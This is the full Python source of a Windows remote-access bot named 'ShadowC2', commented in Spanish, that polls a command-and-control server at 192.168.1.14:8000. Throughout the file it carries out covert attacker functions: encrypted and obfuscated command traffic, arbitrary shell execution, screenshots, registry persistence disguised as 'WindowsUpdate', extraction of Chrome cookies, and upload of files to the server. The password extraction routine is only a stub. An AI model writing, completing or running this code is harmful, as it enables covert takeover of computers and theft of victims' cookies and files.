#!/usr/bin/env python3
"""
ShadowC2 Bot - Windows Edition
Conecta a C2 en 192.168.1.14:8000
"""

import base64
import json
import os
import platform
import random
import socket
import sqlite3
import subprocess
import sys
import time
import uuid
import zlib
from datetime import datetime
from pathlib import Path

import requests
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC

# ============ CONFIGURACION ============
C2_HOST = "192.168.1.14"
C2_PORT = 8000
CHECK_INTERVAL = 10

# ============ CRYPTO ============
_PASSPHRASE = "ShadowC2_Lab_2026_Secret_Key"

def _derive_key(passphrase, salt=None):
    if salt is None:
        salt = os.urandom(16)
    kdf = PBKDF2HMAC(algorithm=hashes.SHA256(), length=32, salt=salt, iterations=100000)
    key = base64.urlsafe_b64encode(kdf.derive(passphrase.encode()))
    return key, salt

def _enc(data, passphrase=_PASSPHRASE):
    key, salt = _derive_key(passphrase)
    f = Fernet(key)
    encrypted = f.encrypt(data.encode())
    return base64.urlsafe_b64encode(salt + encrypted).decode()

def _dec(token, passphrase=_PASSPHRASE):
    try:
        decoded = base64.urlsafe_b64decode(token.encode())
        salt, encrypted = decoded[:16], decoded[16:]
        key, _ = _derive_key(passphrase, salt)
        f = Fernet(key)
        return f.decrypt(encrypted).decode()
    except:
        return None

def _poly_encode(data):
    layers = ['base64', 'hex', 'reverse']
    random.shuffle(layers)
    result = data
    for layer in layers:
        if layer == 'base64':
            result = base64.b64encode(result.encode()).decode()
        elif layer == 'hex':
            result = result.encode().hex()
        elif layer == 'rot13':
            result = result.translate(str.maketrans(
                'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz',
                'NOPQRSTUVWXYZABCDEFGHIJKLMnopqrstuvwxyzabcdefghijklm'))
        elif layer == 'reverse':
            result = result[::-1]
    return result

def _poly_decode(data):
    try:
        layers = ['base64', 'hex', 'reverse']
        random.shuffle(layers)
        content = data
        for layer in layers:
            if layer == 'base64':
                content = base64.b64decode(content).decode()
            elif layer == 'hex':
                content = bytes.fromhex(content).decode()
            elif layer == 'reverse':
                content = content[::-1]
        return content
    except:
        return None

def _compress_and_encrypt(data):
    compressed = zlib.compress(data.encode())
    return _enc(base64.b64encode(compressed).decode())

def _decrypt_and_decompress(data):
    decrypted = _dec(data)
    if decrypted:
        try:
            compressed = base64.b64decode(decrypted)
            return zlib.decompress(compressed).decode()
        except:
            return None
    return None

def _decrypt_command(encrypted):
    poly = _dec(encrypted)
    if poly:
        json_data = _poly_decode(poly)
        if json_data:
            try:
                return json.loads(json_data)
            except:
                return None
    return None

class BotWindows:
    def __init__(self):
        self.bot_id = "".join(random.choices("abcdef0123456789", k=8))
        self.hostname = socket.gethostname()
        self.username = os.getlogin() if hasattr(os, 'getlogin') else 'unknown'
        self.os_info = f"{platform.system()} {platform.release()}"
        self.c2_url = f"http://{C2_HOST}:{C2_PORT}"
        self._j = lambda d: json.dumps(d)
        self._l = lambda s: json.loads(s)
    
    def _post(self, endpoint, data):
        try:
            encrypted = _compress_and_encrypt(data)
            r = requests.post(
                f"{self.c2_url}{endpoint}",
                json={"data": encrypted},
                timeout=random.uniform(8, 15),
                headers={"User-Agent": "Mozilla/5.0", "Content-Type": "application/json"}
            )
            if r.status_code == 200:
                resp_data = r.json().get("data")
                if resp_data:
                    return _decrypt_and_decompress(resp_data)
            return None
        except Exception as e:
            print(f"[ERROR] {e}")
            return None
    
    def _get(self, endpoint):
        try:
            r = requests.get(
                f"{self.c2_url}{endpoint}",
                timeout=random.uniform(8, 15),
                headers={"User-Agent": "Mozilla/5.0", "Accept": "application/json"}
            )
            if r.status_code == 200:
                resp_data = r.json().get("data")
                if resp_data:
                    return _decrypt_and_decompress(resp_data)
            return None
        except Exception as e:
            print(f"[ERROR] {e}")
            return None
    
    def register(self):
        data = self._j({
            "bot_id": self.bot_id,
            "hostname": self.hostname,
            "username": self.username,
            "os": self.os_info,
            "capabilities": ["shell", "screenshot", "keylog", "download", "upload", 
                           "persist", "info", "cookies", "passwords", "processes"]
        })
        result = self._post(f"/c2/stealth/register", data)
        if result:
            parsed = self._l(result)
            self.bot_id = parsed.get("bot_id", self.bot_id)
            return True
        return False
    
    def check_commands(self):
        result = self._get(f"/c2/stealth/check/{self.bot_id}")
        if result:
            parsed = self._l(result)
            commands = []
            for enc_cmd in parsed.get("commands", []):
                cmd = _decrypt_command(enc_cmd)
                if cmd:
                    commands.append(cmd)
            return commands
        return []
    
    def send_result(self, cmd_id, result):
        data = self._j({"cmd_id": cmd_id, "result": result})
        self._post(f"/c2/stealth/result/{self.bot_id}", data)
    
    def execute_shell(self, command):
        try:
            result = subprocess.run(command, shell=True, capture_output=True, 
                                  text=True, timeout=30)
            output = result.stdout
            if result.stderr:
                output += "\n[STDERR] " + result.stderr
            return {"output": output, "returncode": result.returncode}
        except Exception as e:
            return {"error": str(e)}
    
    def take_screenshot(self):
        try:
            import io
            from PIL import ImageGrab
            screenshot = ImageGrab.grab()
            buf = io.BytesIO()
            screenshot.save(buf, format='PNG')
            img_data = base64.b64encode(buf.getvalue()).decode()
            
            data = self._j({"image_data": img_data})
            self._post(f"/c2/stealth/screenshot/{self.bot_id}", data)
            return {"status": "screenshot enviado"}
        except Exception as e:
            return {"error": str(e)}
    
    def get_system_info(self):
        try:
            import psutil
            return {
                "cpu_count": os.cpu_count(),
                "memory_total": psutil.virtual_memory().total,
                "memory_used": psutil.virtual_memory().used,
                "disk_usage": dict(psutil.disk_usage('C:\\')._asdict()),
                "cwd": os.getcwd(),
                "pid": os.getpid(),
                "boot_time": psutil.boot_time(),
                "users": [u._asdict() for u in psutil.users()]
            }
        except:
            return {"hostname": self.hostname, "username": self.username, "os": self.os_info}
    
    def get_processes(self):
        try:
            import psutil
            processes = []
            for proc in psutil.process_iter(['pid', 'name', 'username']):
                try:
                    processes.append(proc.info)
                except:
                    pass
            return {"processes": processes[:100]}
        except Exception as e:
            return {"error": str(e)}
    
    def establish_persistence(self):
        try:
            import winreg
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, 
                               r"Software\Microsoft\Windows\CurrentVersion\Run",
                               0, winreg.KEY_SET_VALUE)
            exe_path = sys.executable if getattr(sys, 'frozen', False) else os.path.abspath(sys.argv[0])
            winreg.SetValueEx(key, "WindowsUpdate", 0, winreg.REG_SZ, exe_path)
            winreg.CloseKey(key)
            return {"method": "registry", "status": "persistencia establecida", "path": exe_path}
        except Exception as e:
            return {"error": str(e)}
    
    def extract_cookies(self):
        cookies = {}
        try:
            import winreg
            # Chrome
            chrome_path = Path(os.environ.get('LOCALAPPDATA', '')) / "Google" / "Chrome" / "User Data" / "Default" / "Cookies"
            if chrome_path.exists():
                conn = sqlite3.connect(str(chrome_path))
                cursor = conn.cursor()
                cursor.execute("SELECT host_key, name, value FROM cookies")
                cookies["chrome"] = [{"host": r[0], "name": r[1], "value": r[2][:30]} for r in cursor.fetchall()[:20]]
                conn.close()
        except Exception as e:
            cookies["error"] = str(e)
        return {"cookies_found": len(cookies), "browsers": cookies}
    
    def extract_passwords(self):
        return {"passwords_found": 0, "browsers": {}, "note": "Requiere DPAPI decryption"}
    
    def download_file(self, filepath):
        try:
            if not os.path.exists(filepath):
                return {"error": "Archivo no encontrado"}
            filename = os.path.basename(filepath)
            with open(filepath, 'rb') as f:
                file_data = base64.b64encode(f.read()).decode()
            data = self._j({"filename": filename, "original_path": filepath, "file_data": file_data})
            self._post(f"/c2/stealth/file/{self.bot_id}", data)
            return {"status": "archivo subido", "filename": filename}
        except Exception as e:
            return {"error": str(e)}
    
    def run(self):
        if not self.register():
            print("[!] No se pudo registrar")
            return
        
        print(f"[+] Bot {self.bot_id} registrado")
        
        while True:
            try:
                commands = self.check_commands()
                for cmd in commands:
                    command = cmd.get("command")
                    args = cmd.get("args", [])
                    cmd_id = cmd.get("cmd_id")
                    
                    if command == "shell":
                        result = self.execute_shell(" ".join(args) if args else "whoami")
                    elif command == "screenshot":
                        result = self.take_screenshot()
                    elif command == "info":
                        result = self.get_system_info()
                    elif command == "processes":
                        result = self.get_processes()
                    elif command == "persist":
                        result = self.establish_persistence()
                    elif command == "cookies":
                        result = self.extract_cookies()
                    elif command == "passwords":
                        result = self.extract_passwords()
                    elif command == "download":
                        result = self.download_file(args[0] if args else "C:\\Windows\\System32\\drivers\\etc\\hosts")
                    elif command == "kill":
                        self.send_result(cmd_id, {"status": "killed"})
                        sys.exit(0)
                    else:
                        result = {"error": "Comando desconocido"}
                    
                    self.send_result(cmd_id, result)
                
                time.sleep(random.uniform(8, 15))
            except Exception as e:
                print(f"[!] Error: {e}")
                time.sleep(random.uniform(8, 15))

if __name__ == "__main__":
    bot = BotWindows()
    bot.run()
